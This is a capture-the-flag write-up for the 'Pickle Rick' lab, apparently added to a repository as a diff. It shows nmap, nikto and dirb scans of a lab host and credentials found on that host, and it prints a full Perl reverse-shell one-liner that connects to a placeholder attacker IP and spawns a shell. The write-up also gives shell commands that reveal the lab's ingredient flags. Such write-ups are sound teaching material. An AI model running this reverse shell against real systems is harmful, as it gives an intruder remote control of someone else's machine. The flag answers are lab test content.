@@ -1,0 +1,112 @@
+---------Pickle Rick CTF-----------
+*See issues for walkthrough screenshots.
+
+Enumeration
+
+nmap 10.10.163.170 -A -sC 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-13 13:58 EDT
+Nmap scan report for 10.10.163.170
+Host is up (0.17s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 7f:11:66:60:89:42:48:79:12:63:d8:77:13:23:7c:fd (RSA)
+|   256 23:4c:51:dc:87:bd:01:43:25:e0:ec:d2:87:81:12:db (ECDSA)
+|_  256 2b:12:3e:1d:30:0d:c0:1a:5c:32:65:a2:c3:31:c5:b1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Rick is sup4r cool
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+(thor㉿Asgard)-[~]
+└─$ nikto -h http://10.10.163.170
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.163.170
++ Target Hostname:    10.10.163.170
++ Target Port:        80
++ Start Time:         2022-07-13 14:04:25 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
++ Cookie PHPSESSID created without the httponly flag
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3233: /icons/README: Apache default file found.
+
+(thor㉿Asgard)-[~]
+└─$ dirb http://10.10.163.170
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Jul 13 13:59:43 2022
+URL_BASE: http://10.10.163.170/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.163.170/ ----
+==> DIRECTORY: http://10.10.163.170/assets/                                                                                                                                                                    
++ http://10.10.163.170/index.html (CODE:200|SIZE:1062)                                                                                                                                                         
++ http://10.10.163.170/robots.txt (CODE:200|SIZE:17)                                                                                                                                                           
++ http://10.10.163.170/server-status (CODE:403|SIZE:301)                                                                                                                                                       
+                                                                                                                                                                                                               
+---- Entering directory: http://10.10.163.170/assets/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Wed Jul 13 14:14:16 2022
+DOWNLOADED: 4612 - FOUND: 3
+
+Navigated to the website
+
+
+
+
+So now we have a username: R1ckRul3s
+We navigated to robots.txt and found what I assume to be a password: Wubbalubbadubdub
+
+After some more enumeration, we find a login page:
+
+
+
+We insert our credentials and..... WE'RE IN!
+
+
+
+Firstly, I checked the source page. It's habbit. I guess that's my pentester mindset because I do this even though i have terminal right in front of me. :P
+If I was following the CTF mindset I would have immeadietly started testing for shells. 
+I find some Base64 encoded text and think I am onto something. 
+My pentester mindset doesnt help me out much in this scenario, and actually leads me down a literal rabit hole as indicated by Burpsuite(+1 for Burpsuite).
+
+
+
+And so I proceeded to try some reverse shells. I was finally able to get one with the pearl shell: 
+
+perl -e 'use Socket;$i="ATTACKER-IP";$p=LISTENING-PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+whoami
+root
+
+And boom! We are root! 
+
+cat Sup3rS3cretPickl3Ingred.txt
+mr. meeseek hair
+cd /root
+ls
+3rd.txt
+cat 3rd.txt
+3rd ingredients: fleeb juice
+cd rick
+cat 'second ingredients'
